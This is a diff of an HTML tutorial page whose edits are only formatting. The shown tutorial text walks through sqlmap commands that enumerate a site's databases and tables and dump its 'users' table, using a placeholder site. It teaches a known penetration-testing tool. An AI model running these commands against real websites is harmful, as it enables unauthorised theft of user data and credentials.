@@ -259,7 +259,7 @@ available databases [2]:
 
 <span class="username">andrew@local:~$</span></div>
 
-Databases such as information_schema, performance_schema, and mysql are default system databases. The main database usually has a name similar to that of the website, so in our case the good one is "mywebsite_db". Now that we have the database name, we need to extract the table names from it. To do this, we will enter the database name using the -D attribute and use the -tables option.<br><br>
+Databases such as information_schema, performance_schema, and mysql are default system databases. The main database usually has a name similar to that of the website, so in our case the good one is "mywebsite_db". Now that we have the database name, we need to extract the table names from it. To do this, we will enter the database name using the -D attribute and use the -tables option.<br>
 
 <div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -tables</div><br><br>
 
@@ -269,16 +269,16 @@ After running this command, we will receive an output similar to:<br><br>
 <div class="code-box2">Database: mywebsite_db
 [5 tables]
 
-+----------+
++--------------------+
 | documents
 | news
 | photos
 | users
-+----------+</div><br>
++--------------------+</div><br>
 
 To extract the content of a specific table, we will enter the database with -D and the table name using the -T attribute and use the "-dump" option.<br><br>
 
-<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -T users -dump</div><br><br>
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -T users -dump</div><br>
 
 Now we have the content of the users table. If we want, we can go further and extract only a specific column or certain columns from the table using the "-columns" option, and then, after we have it, entering them with -C option and retrive it with -dump.<br><br>
 
